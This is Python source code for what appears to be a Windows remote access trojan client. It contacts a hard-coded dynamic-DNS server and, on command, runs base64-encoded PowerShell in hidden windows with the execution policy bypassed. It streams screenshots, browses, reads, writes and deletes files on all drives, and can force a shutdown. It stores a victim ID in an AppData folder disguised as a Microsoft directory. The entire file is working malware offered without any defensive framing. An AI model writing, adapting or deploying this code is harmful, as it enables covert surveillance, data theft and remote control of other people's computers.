import os
import sys
import time
import io
import base64
import threading
import subprocess
import ctypes
import shutil
import string
from typing import Optional
from PIL import ImageGrab, Image
import socketio

# ── Single Instance Enforcement (Windows Mutex) ──

kernel32 = ctypes.windll.kernel32
mutex = kernel32.CreateMutexW(None, False, "run_py_mutex")
if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
    sys.exit(0)

# ── Server Configuration & Client ID ──

VPS_URL = os.getenv("VPS_URL", "http://runx.ddns.net")

try:
    import client_config

    CLIENT_KEY = getattr(client_config, "CLIENT_KEY", "")
    CLIENT_VERSION = getattr(client_config, "CLIENT_VERSION", "dev")
except ImportError:
    CLIENT_KEY = ""
    CLIENT_VERSION = "dev"

app_data = os.getenv("APPDATA") or os.path.expanduser("~\\AppData\\Roaming")
data_dir = os.path.join(app_data, "Microsoft", "run")
ID_PATH = os.path.join(data_dir, "run.txt")
DAT_PATH = os.path.join(data_dir, "run.dat")
raw_user = os.getenv("USERNAME", "user")
os_suffix = "W"

if os.path.exists(DAT_PATH):
    try:
        with open(DAT_PATH, "r", encoding="utf-8") as f:
            v_raw = f.read().strip()
            if v_raw:
                CLIENT_VERSION = v_raw[:7]
    except Exception:
        pass

os.makedirs(os.path.dirname(ID_PATH), exist_ok=True)
if os.path.exists(ID_PATH):
    with open(ID_PATH, "r", encoding="utf-8") as f:
        raw = f.read().strip()
    unique_id = raw[:8] if len(raw) >= 8 else raw
else:
    import uuid

    unique_id = str(uuid.uuid4())[:8]
    with open(ID_PATH, "w", encoding="utf-8") as f:
        f.write(unique_id)

unique_user = f"{raw_user}-{unique_id}-{os_suffix}"

# ── SocketIO Client Initialization ──

sio = socketio.Client(reconnection=True, reconnection_delay=2)

capture_active = False
capture_thread = None


def grab_screen() -> Optional[Image.Image]:
    """Capture desktop screenshot via Pillow ImageGrab."""
    try:
        return ImageGrab.grab()
    except Exception:
        return None


def take_and_upload_screenshot(req_id: Optional[str] = None) -> Optional[str]:
    """Capture desktop screenshot, resize/convert, and upload to server."""
    try:
        timestamp = (
            time.strftime("%Y%m%d%H%M%S") + f"{int(time.time() * 1000) % 1000:03d}"
        )
        filename = f"{timestamp}.jpg"

        img = grab_screen()
        if img is None:
            if req_id and sio.connected:
                sio.emit(
                    "capture_screenshot_res",
                    {"req_id": req_id, "error": "Failed to grab screen"},
                )
            return None

        w, h = img.size
        img_resized = img.resize(
            (w // 2, h // 2), Image.Resampling.BILINEAR
        ).convert("L")

        buf = io.BytesIO()
        img_resized.save(buf, format="JPEG", quality=80)
        img_bytes = buf.getvalue()

        if sio.connected:
            sio.emit(
                "upload_frame",
                {"username": unique_user, "filename": filename, "image": img_bytes},
            )
            if req_id:
                sio.emit(
                    "capture_screenshot_res",
                    {
                        "req_id": req_id,
                        "success": True,
                        "filename": filename,
                        "width": w,
                        "height": h,
                    },
                )
            return filename
    except Exception as e:
        if req_id and sio.connected:
            try:
                sio.emit("capture_screenshot_res", {"req_id": req_id, "error": str(e)})
            except Exception:
                pass
    return None


def capture_loop():
    """Continuous screen frame capture stream."""
    global capture_active

    while capture_active:
        take_and_upload_screenshot()
        time.sleep(1)


@sio.event
def connect():
    print(f"Connected to WebSocket server as {unique_user} (version: {CLIENT_VERSION})")
    sio.emit(
        "register",
        {
            "username": unique_user,
            "auth_token": CLIENT_KEY,
            "version": CLIENT_VERSION,
        },
    )


@sio.event
def disconnect():
    print("Disconnected from WebSocket server")


@sio.on("exec_command")
def on_exec_command(data):
    cmd_raw = data.get("cmd", "")
    visible = data.get("visible", 0)

    if not cmd_raw:
        return

    try:
        decoded_cmd = base64.b64decode(cmd_raw).decode("utf-8")
    except Exception:
        decoded_cmd = cmd_raw

    print(f"Executing command: {decoded_cmd}")

    if "panic" in decoded_cmd.lower():
        sys.exit(0)
    elif "altf4" in decoded_cmd.lower():
        subprocess.Popen(
            ["shutdown", "/s", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW
        )
        return

    cmd_str = decoded_cmd.strip()

    creation_flags = (
        subprocess.CREATE_NEW_CONSOLE if visible else subprocess.CREATE_NO_WINDOW
    )
    if cmd_str.lower().startswith("powershell"):
        subprocess.Popen(cmd_str, shell=True, creationflags=creation_flags)
    else:
        ps_cmd = [
            "powershell.exe",
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
        ]
        if not visible:
            ps_cmd.extend(["-WindowStyle", "Hidden"])
        ps_cmd.extend(["-Command", cmd_str])
        subprocess.Popen(ps_cmd, creationflags=creation_flags)


@sio.on("set_capture")
def on_set_capture(data):
    global capture_active, capture_thread
    should_capture = bool(data.get("capture", False))

    if should_capture and not capture_active:
        capture_active = True
        capture_thread = threading.Thread(target=capture_loop, daemon=True)
        capture_thread.start()
    elif not should_capture and capture_active:
        capture_active = False


@sio.on("take_screenshot")
def on_take_screenshot(data=None):
    req_id = data.get("req_id") if isinstance(data, dict) else None
    threading.Thread(target=take_and_upload_screenshot, args=(req_id,), daemon=True).start()


# ── File System / FTP Browser Handlers ──

def get_windows_drives():
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drive_root = f"{letter}:\\"
            label = "Local Disk"
            total, free = 0, 0
            try:
                vol_buf = ctypes.create_unicode_buffer(1024)
                fs_buf = ctypes.create_unicode_buffer(1024)
                ctypes.windll.kernel32.GetVolumeInformationW(
                    drive_root, vol_buf, ctypes.sizeof(vol_buf),
                    None, None, None, fs_buf, ctypes.sizeof(fs_buf)
                )
                raw_label = vol_buf.value.strip()
                if raw_label:
                    label = raw_label
            except Exception:
                pass
            try:
                total, used, free = shutil.disk_usage(drive_root)
            except Exception:
                pass
            drives.append({
                "path": drive_root,
                "label": f"{letter}: ({label})",
                "total": total,
                "free": free
            })
        bitmask >>= 1
    return drives


def scan_directory(target_path):
    target_path = os.path.abspath(target_path)
    if not os.path.exists(target_path):
        return {"error": f"Path not found: {target_path}", "path": target_path, "items": []}

    items = []
    try:
        with os.scandir(target_path) as it:
            for entry in it:
                try:
                    is_dir = entry.is_dir(follow_symlinks=False)
                    stat = entry.stat(follow_symlinks=False)
                    ext = "" if is_dir else os.path.splitext(entry.name)[1].lower()
                    items.append({
                        "name": entry.name,
                        "is_dir": is_dir,
                        "size": 0 if is_dir else stat.st_size,
                        "mtime": int(stat.st_mtime),
                        "ext": ext
                    })
                except Exception:
                    items.append({
                        "name": entry.name,
                        "is_dir": False,
                        "size": 0,
                        "mtime": 0,
                        "ext": "",
                        "restricted": True
                    })
    except PermissionError:
        return {"error": "Access Denied: Administrator permission required", "path": target_path, "items": []}
    except Exception as e:
        return {"error": str(e), "path": target_path, "items": []}

    items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
    parent = os.path.dirname(target_path) if os.path.dirname(target_path) != target_path else None
    return {
        "path": target_path,
        "parent": parent,
        "items": items
    }


def read_file_preview(file_path, max_bytes=512000):
    try:
        file_path = os.path.abspath(file_path)
        if not os.path.isfile(file_path):
            return {"error": "Target is not a valid file"}
        size = os.path.getsize(file_path)
        if size > max_bytes:
            return {"error": f"File too large for live preview ({size} bytes). Limit is 500 KB.", "name": os.path.basename(file_path)}
        with open(file_path, "rb") as f:
            raw = f.read(max_bytes)
        try:
            text = raw.decode("utf-8")
            return {"name": os.path.basename(file_path), "path": file_path, "size": size, "type": "text", "content": text}
        except UnicodeDecodeError:
            return {"name": os.path.basename(file_path), "path": file_path, "size": size, "type": "binary", "content": base64.b64encode(raw).decode("utf-8")}
    except Exception as e:
        return {"error": str(e)}


def write_file(file_path, content, is_base64=False):
    try:
        file_path = os.path.abspath(file_path)
        parent = os.path.dirname(file_path)
        if parent and not os.path.exists(parent):
            os.makedirs(parent, exist_ok=True)
        if is_base64:
            raw = base64.b64decode(content)
            with open(file_path, "wb") as f:
                f.write(raw)
        else:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(content)
        return {"success": True, "path": file_path, "size": os.path.getsize(file_path)}
    except Exception as e:
        return {"error": str(e)}


def delete_path(target_path):
    try:
        target_path = os.path.abspath(target_path)
        if not os.path.exists(target_path):
            return {"error": "Target path not found"}
        if os.path.isdir(target_path):
            shutil.rmtree(target_path)
        else:
            os.remove(target_path)
        return {"success": True, "path": target_path}
    except Exception as e:
        return {"error": str(e)}


def make_directory(dir_path):
    try:
        dir_path = os.path.abspath(dir_path)
        os.makedirs(dir_path, exist_ok=True)
        return {"success": True, "path": dir_path}
    except Exception as e:
        return {"error": str(e)}


def rename_path(old_path, new_path):
    try:
        old_path = os.path.abspath(old_path)
        new_path = os.path.abspath(new_path)
        if not os.path.exists(old_path):
            return {"error": "Source path does not exist"}
        os.rename(old_path, new_path)
        return {"success": True, "old_path": old_path, "new_path": new_path}
    except Exception as e:
        return {"error": str(e)}


@sio.on("fs_list_req")
def on_fs_list_req(data):
    req_id = data.get("req_id")
    path = data.get("path")
    drives = get_windows_drives()
    if not path or path == "drives":
        payload = {"is_drives": True, "drives": drives, "path": "Drives", "items": []}
    else:
        payload = scan_directory(path)
        payload["is_drives"] = False
        payload["drives"] = drives
    sio.emit("fs_list_res", {"req_id": req_id, "payload": payload})


@sio.on("fs_read_req")
def on_fs_read_req(data):
    req_id = data.get("req_id")
    file_path = data.get("path")
    payload = read_file_preview(file_path)
    sio.emit("fs_read_res", {"req_id": req_id, "payload": payload})


@sio.on("fs_write_req")
def on_fs_write_req(data):
    req_id = data.get("req_id")
    file_path = data.get("path")
    content = data.get("content", "")
    is_base64 = bool(data.get("is_base64", False))
    payload = write_file(file_path, content, is_base64=is_base64)
    sio.emit("fs_write_res", {"req_id": req_id, "payload": payload})


@sio.on("fs_delete_req")
def on_fs_delete_req(data):
    req_id = data.get("req_id")
    target_path = data.get("path")
    payload = delete_path(target_path)
    sio.emit("fs_delete_res", {"req_id": req_id, "payload": payload})


@sio.on("fs_mkdir_req")
def on_fs_mkdir_req(data):
    req_id = data.get("req_id")
    dir_path = data.get("path")
    payload = make_directory(dir_path)
    sio.emit("fs_mkdir_res", {"req_id": req_id, "payload": payload})


@sio.on("fs_rename_req")
def on_fs_rename_req(data):
    req_id = data.get("req_id")
    old_path = data.get("old_path")
    new_path = data.get("new_path")
    payload = rename_path(old_path, new_path)
    sio.emit("fs_rename_res", {"req_id": req_id, "payload": payload})


def heartbeat_loop():
    while True:
        if sio.connected:
            try:
                sio.emit(
                    "heartbeat",
                    {
                        "username": unique_user,
                        "version": CLIENT_VERSION,
                    },
                )
            except Exception:
                pass
        time.sleep(5)


def main():
    hb_thread = threading.Thread(target=heartbeat_loop, daemon=True)
    hb_thread.start()

    while True:
        try:
            if not sio.connected:
                sio.connect(
                    VPS_URL,
                    wait_timeout=10,
                    transports=["websocket", "polling"],
                    auth={"token": CLIENT_KEY},
                )
                sio.wait()
        except Exception:
            pass
        time.sleep(5)


if __name__ == "__main__":
    main()
